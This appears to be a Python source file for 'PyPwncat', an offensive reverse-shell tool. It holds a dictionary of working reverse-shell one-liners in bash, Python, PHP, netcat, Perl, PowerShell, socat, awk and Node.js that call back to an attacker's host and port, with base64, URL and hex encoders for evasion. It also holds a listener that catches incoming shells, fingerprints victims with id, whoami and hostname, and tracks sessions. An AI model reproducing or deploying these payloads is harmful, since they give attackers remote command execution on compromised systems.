#!/usr/bin/env python3
import asyncio
import base64
import click
import os
import platform
import random
import socket
import string
import sys
import threading
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple
import rich
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
console = Console()
PAYLOADS = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "bash2": "0<&196;exec 196<>/dev/tcp/{lhost}/{lport}; sh <&196 >&196 2>&196",
    "python": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])",
    "python3": "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])",
    "php": "php -r '$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "nc": "nc -e /bin/sh {lhost} {lport}",
    "nc2": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
    "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{lhost}\",{lport}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
    "powershell": "$client = New-Object System.Net.Sockets.TCPClient(\"{lhost}\",{lport});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    "java": "r = Runtime.getRuntime();p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{lhost}/{lport};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[]);p.waitFor();",
    "socat": "socat TCP:{lhost}:{lport} EXEC:/bin/sh",
    "telnet": "TF=$(mktemp -u);mkfifo $TF && telnet {lhost} {lport} 0<$TF | /bin/sh 1>$TF",
    "awk": "awk 'BEGIN {{s = \"/inet/tcp/0/{lhost}/{lport}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while((c |& getline) > 0) print $0 |& s; close(c); }}}} while(c != \"exit\") close(s); }}}}' /dev/null",
    "lua": "lua -e 'require(\"socket\").connect(\"{lhost}\", {lport})'",
    "nodejs": "require('child_process').exec('bash -i >& /dev/tcp/{lhost}/{lport} 0>&1')",
}
class Session:
    def __init__(self, sid: int, addr: Tuple[str, int], stype: str):
        self.sid = sid
        self.addr = addr
        self.stype = stype
        self.sock: Optional[socket.socket] = None
        self.reader: Optional[asyncio.StreamReader] = None
        self.writer: Optional[asyncio.StreamWriter] = None
        self.connected = True
        self.os = "unknown"
        self.user = "unknown"
        self.hostname = "unknown"
        self.start_time = datetime.now().isoformat()
        self.lock = threading.Lock()
    def info(self) -> str:
        return f"[{self.sid}] {self.stype} {self.addr[0]}:{self.addr[1]} {self.os} {self.user}@{self.hostname}"
class PyPwncat:
    def __init__(self, lhost: str, lport: int, listen: bool, connect: bool, execute: str, shell: bool, payload: str, encoder: str, output: str, verbose: bool):
        self.lhost = lhost
        self.lport = lport
        self.listen = listen
        self.connect = connect
        self.execute = execute
        self.shell = shell
        self.payload = payload
        self.encoder = encoder
        self.output = output
        self.verbose = verbose
        self.sessions: Dict[int, Session] = {}
        self.session_counter = 0
        self.lock = threading.Lock()
        self.current_session: Optional[int] = None
    def banner(self):
        console.print(Panel.fit("[bold #0e6b0e]PyPwncat v1.0 - Advanced Netcat Alternative[/bold #0e6b0e]", border_style="#0e6b0e"))
    def generate_payload(self, ptype: str, lhost: str, lport: int) -> str:
        tmpl = PAYLOADS.get(ptype, PAYLOADS["bash"])
        raw = tmpl.format(lhost=lhost, lport=lport)
        if self.encoder == "base64":
            raw = base64.b64encode(raw.encode()).decode()
        elif self.encoder == "url":
            import urllib.parse
            raw = urllib.parse.quote(raw)
        elif self.encoder == "hex":
            raw = raw.encode().hex()
        if self.output:
            with open(self.output, "w") as f:
                f.write(raw + "\n")
            console.print(f"[green][+] Payload saved to {self.output}[/green]")
        return raw
    def list_payloads(self):
        console.print("[bold #0e6b0e]Available Payloads:[/bold #0e6b0e]")
        for name in PAYLOADS:
            console.print(f"  [green]{name}[/green]")
    async def start(self):
        self.banner()
        if self.payload:
            if self.payload == "list":
                self.list_payloads()
                return
            p = self.generate_payload(self.payload, self.lhost, self.lport)
            console.print(f"[cyan][*] {self.payload} payload:[/cyan]")
            console.print(p)
            return
        if self.listen:
            await self.do_listen()
        elif self.connect:
            await self.do_connect(self.lhost, self.lport)
        elif self.execute:
            await self.do_execute()
        elif self.shell:
            await self.do_interactive_shell()
        else:
            console.print("[red][!] Specify --listen, --connect, --execute, --shell, or --payload[/red]")
    async def do_listen(self):
        console.print(f"[cyan][*] Listening on {self.lhost}:{self.lport}[/cyan]")
        server = await asyncio.start_server(self.handle_client, self.lhost, self.lport)
        async with server:
            await server.serve_forever()
    async def handle_client(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
        addr = writer.get_extra_info("peername")
        with self.lock:
            self.session_counter += 1
            sid = self.session_counter
        session = Session(sid, addr, "reverse")
        session.reader = reader
        session.writer = writer
        self.sessions[sid] = session
        self.current_session = sid
        console.print(f"[bold green][+] Session {sid} opened: {addr[0]}:{addr[1]}[/bold green]")
        await self.gather_info(session)
        await self.interact(session)
    async def do_connect(self, host: str, port: int):
        console.print(f"[cyan][*] Connecting to {host}:{port}[/cyan]")
        try:
            reader, writer = await asyncio.open_connection(host, port)
            with self.lock:
                self.session_counter += 1
                sid = self.session_counter
            session = Session(sid, (host, port), "bind")
            session.reader = reader
            session.writer = writer
            self.sessions[sid] = session
            self.current_session = sid
            console.print(f"[bold green][+] Connected to {host}:{port} (session {sid})[/bold green]")
            await self.gather_info(session)
            await self.interact(session)
        except Exception as e:
            console.print(f"[red][!] Connection failed: {e}[/red]")
    async def do_execute(self):
        console.print(f"[cyan][*] Executing: {self.execute}[/cyan]")
        proc = await asyncio.create_subprocess_shell(
            self.execute,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            stdin=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        if stdout:
            console.print(stdout.decode("utf-8", errors="replace"))
        if stderr:
            console.print(stderr.decode("utf-8", errors="replace"), style="red")
    async def do_interactive_shell(self):
        console.print("[cyan][*] Interactive shell mode[/cyan]")
        if platform.system() == "Windows":
            proc = await asyncio.create_subprocess_shell(
                "cmd.exe",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE
            )
        else:
            proc = await asyncio.create_subprocess_shell(
                "/bin/sh",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                stdin=asyncio.subprocess.PIPE
            )
        async def read_out():
            while True:
                line = await proc.stdout.readline()
                if not line:
                    break
                console.print(line.decode("utf-8", errors="replace").rstrip())
        async def read_err():
            while True:
                line = await proc.stderr.readline()
                if not line:
                    break
                console.print(line.decode("utf-8", errors="replace").rstrip(), style="red")
        async def write_in():
            while True:
                try:
                    data = await asyncio.get_event_loop().run_in_executor(None, input, "shell> ")
                    proc.stdin.write((data + "\n").encode())
                    await proc.stdin.drain()
                except EOFError:
                    break
        await asyncio.gather(read_out(), read_err(), write_in())
    async def gather_info(self, session: Session):
        try:
            session.writer.write(b"id\n")
            await session.writer.drain()
            await asyncio.sleep(0.5)
            data = await asyncio.wait_for(session.reader.readline(), timeout=2.0)
            out = data.decode("utf-8", errors="replace").strip()
            if "uid=" in out.lower():
                session.os = "linux"
                session.user = out
            elif "windows" in out.lower() or "\\" in out:
                session.os = "windows"
            else:
                session.writer.write(b"whoami\n")
                await session.writer.drain()
                await asyncio.sleep(0.5)
                data = await asyncio.wait_for(session.reader.readline(), timeout=2.0)
                session.user = data.decode("utf-8", errors="replace").strip()
                session.os = "windows" if "\\" in session.user else "linux"
        except Exception:
            pass
        try:
            session.writer.write(b"hostname\n")
            await session.writer.drain()
            await asyncio.sleep(0.5)
            data = await asyncio.wait_for(session.reader.readline(), timeout=2.0)
            session.hostname = data.decode("utf-8", errors="replace").strip()
        except Exception:
            pass
        console.print(f"[dim]{session.info()}[/dim]")
    async def interact(self, session: Session):
        try:
            while session.connected:
                data = await session.reader.read(4096)
                if not data:
                    break
                text = data.decode("utf-8", errors="replace")
                console.print(text, end="")
        except Exception:
            pass
        finally:
            session.connected = False
            console.print(f"\n[yellow][*] Session {session.sid} closed[/yellow]")
    def list_sessions(self):
        if not self.sessions:
            console.print("[yellow][*] No active sessions[/yellow]")
            return
        console.print("[bold #0e6b0e]Active Sessions:[/bold #0e6b0e]")
        for sid, s in self.sessions.items():
            status = "[green]connected[/green]" if s.connected else "[red]disconnected[/red]"
            console.print(f"  {sid}: {s.addr[0]}:{s.addr[1]} ({s.stype}) {status}")
    async def send_to_session(self, sid: int, data: str):
        s = self.sessions.get(sid)
        if s and s.writer:
            s.writer.write(data.encode())
            await s.writer.drain()
@click.group(invoke_without_command=True)
@click.option("-l", "--listen", is_flag=True, help="Listen mode")
@click.option("-c", "--connect", is_flag=True, help="Connect mode")
@click.option("-e", "--execute", help="Execute command")
@click.option("--shell", is_flag=True, help="Interactive shell")
@click.option("-p", "--payload", help="Generate payload (use 'list' to see all)")
@click.option("-lp", "--lport", default=4444, help="Local port")
@click.option("-lh", "--lhost", default="0.0.0.0", help="Local host")
@click.option("--encoder", default="", help="Encode payload: base64, url, hex")
@click.option("-o", "--output", help="Output file for payload")
@click.option("-v", "--verbose", is_flag=True, help="Verbose")
@click.pass_context
def cli(ctx, listen, connect, execute, shell, payload, lport, lhost, encoder, output, verbose):
    if ctx.invoked_subcommand is None:
        app = PyPwncat(lhost, lport, listen, connect, execute, shell, payload, encoder, output, verbose)
        asyncio.run(app.start())
@cli.command()
@click.option("-lh", "--lhost", default="0.0.0.0", help="Listen host")
@click.option("-lp", "--lport", default=4444, help="Listen port")
def listen(lhost, lport):
    app = PyPwncat(lhost, lport, True, False, "", False, "", "", "", False)
    asyncio.run(app.start())
@cli.command()
@click.argument("host")
@click.argument("port", default=4444)
def connect(host, port):
    app = PyPwncat(host, int(port), False, True, "", False, "", "", "", False)
    asyncio.run(app.start())
@cli.command()
@click.option("-t", "--type", "ptype", default="bash", help="Payload type")
@click.option("-lh", "--lhost", required=True, help="Local host")
@click.option("-lp", "--lport", default=4444, help="Local port")
@click.option("--encoder", default="", help="Encoder")
@click.option("-o", "--output", help="Output file")
def generate(ptype, lhost, lport, encoder, output):
    app = PyPwncat(lhost, lport, False, False, "", False, ptype, encoder, output, False)
    asyncio.run(app.start())
@cli.command()
def payloads():
    app = PyPwncat("", 0, False, False, "", False, "list", "", "", False)
    asyncio.run(app.start())
if __name__ == "__main__":
    cli()
